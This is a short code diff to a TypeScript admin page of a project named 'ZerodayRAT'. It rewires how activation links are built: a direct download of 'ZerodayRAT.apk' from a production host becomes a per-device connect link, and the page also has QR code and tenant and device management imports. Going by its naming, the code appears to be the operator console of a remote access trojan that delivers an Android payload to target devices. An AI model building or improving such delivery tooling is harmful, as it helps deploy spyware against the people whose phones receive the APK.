@@ -4,6 +4,7 @@ import QRCode from "qrcode";
 import { adminApi } from "../api/admin";
 import { devicesApi } from "../api/devices";
 import type { AdminDeviceSummary, AdminTenant, Device } from "../api/types";
+import { buildConnectLink } from "../api/apk";
 import PdfExportModal from "../components/PdfExportModal";
 
 const PRODUCTION_APP_URL = "https://zerodayrat.vercel.app";
@@ -27,10 +28,10 @@ function saveStoredPassword(key: string, pass: string) {
   } catch {}
 }
 
-function buildActivationLink(_device?: AdminDeviceSummary | Device): string {
+function buildActivationLink(device?: AdminDeviceSummary | Device): string {
   const isLocalDev = ["localhost", "127.0.0.1"].includes(window.location.hostname);
   const origin = isLocalDev ? PRODUCTION_APP_URL : window.location.origin;
-  return `${origin}/download/ZerodayRAT.apk`;
+  return buildConnectLink(origin, device);
 }
 
 export default function AdminPage() {
